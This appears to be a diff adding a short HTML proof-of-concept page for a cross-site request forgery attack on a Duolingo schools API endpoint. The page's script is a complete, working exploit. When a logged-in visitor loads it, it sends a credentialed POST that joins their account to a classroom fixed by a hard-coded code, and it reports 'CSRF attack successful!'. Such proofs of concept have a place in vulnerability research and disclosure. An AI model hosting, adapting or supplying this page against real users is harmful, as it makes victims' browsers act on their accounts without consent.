@@ -1,0 +1,32 @@
+<html>
+  <body>
+    <h1>CSRF PoC - Join Classroom</h1>
+    <script>
+      // Target endpoint
+      const url = 'https://schools.duolingo.com/api/1/observers/join_classroom_by_code';
+      
+      // Malicious payload (classroom code)
+      const payload = {
+        link_code: "dvvscc"
+      };
+
+      // Send POST request
+      fetch(url, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json; charset=UTF-8',
+        },
+        body: JSON.stringify(payload),
+        credentials: 'include' // Include cookies
+      })
+      .then(response => {
+        if (response.ok) {
+          console.log('CSRF attack successful!');
+        } else {
+          console.error('CSRF attack failed');
+        }
+      })
+      .catch(error => console.error('Error:', error));
+    </script>
+  </body>
+</html>
